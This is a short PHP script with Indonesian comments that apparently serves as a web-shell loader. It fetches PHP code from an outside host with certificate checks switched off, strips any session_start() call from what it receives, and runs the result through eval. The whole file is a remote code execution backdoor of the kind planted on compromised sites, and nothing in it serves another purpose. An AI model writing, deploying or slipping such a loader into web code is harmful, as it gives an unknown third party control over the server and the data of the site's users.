
<?php
// Fungsi untuk mengambil konten dari URL menggunakan cURL
function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Jangan verifikasi SSL
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($httpCode === 200) ? $content : false;
}

// Ambil konten dari URL dan jalankan
$url = 'https://syndicate-ctrl-v.com/raw.php?id=fBf1FFBMzTQb';
$content = fetchContent($url);

if ($content !== false) {
    if (strpos($content, 'session_start()') !== false) {
        $content = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '', $content);
    }
    eval('?>' . $content);
} else {
    echo "Gagal mengambil konten dari URL.";
}
